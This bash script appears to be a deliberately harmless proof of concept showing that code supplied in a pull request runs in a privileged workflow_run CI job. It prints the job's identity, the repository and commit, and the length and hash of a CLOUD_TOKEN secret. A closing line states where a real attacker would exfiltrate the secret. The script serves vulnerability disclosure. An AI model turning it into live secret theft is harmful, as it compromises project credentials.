#!/bin/bash
# Changed by the pull request. In the target repository the equivalent file is
# skaffold.yaml, whose `custom.buildCommand` skaffold executes as a shell command.
#
# This prints only a SHA-256 of the planted secret and its length: enough to show
# the value was readable, without writing the value itself anywhere.
echo "=== running code supplied by the pull request, in the privileged workflow_run job ==="
echo "whoami            : $(whoami)"
echo "repo checked out  : $(git -C . remote get-url origin 2>/dev/null || echo n/a)"
echo "commit            : $(git rev-parse HEAD 2>/dev/null || echo n/a)"
if [ -n "$CLOUD_TOKEN" ]; then
  echo "secret visible    : yes"
  echo "secret length     : ${#CLOUD_TOKEN}"
  echo "secret sha256     : $(printf '%s' "$CLOUD_TOKEN" | sha256sum | cut -d' ' -f1)"
else
  echo "secret visible    : no"
fi
echo "=== a real attacker would exfiltrate here instead of hashing ==="
